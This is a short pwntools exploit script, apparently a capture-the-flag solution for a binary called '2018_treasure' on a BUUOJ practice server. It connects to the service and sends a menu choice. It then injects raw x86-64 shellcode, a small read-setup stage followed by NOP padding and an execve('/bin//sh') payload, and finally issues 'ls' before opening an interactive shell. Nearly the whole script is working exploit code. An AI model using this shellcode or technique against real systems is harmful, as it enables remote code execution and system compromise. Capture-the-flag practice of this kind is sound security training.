from pwn import *
context.log_level="debug"
p=process('./2018_treasure')
p=remote('node3.buuoj.cn',25678)
 
p.recv()
p.sendline("1")
p.recv()
# gdb .attach(p)
payload="\x33\xc0\x52\x5e\x8b\xd1\x0f\x05\x90"
shellcode=payload+"\x90\x90\x90\x90\x90\x90\x90\x90\x90"+"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"+"\x90"#shellcode
p.sendline(shellcode)
p.sendline("ls")
p.interactive()
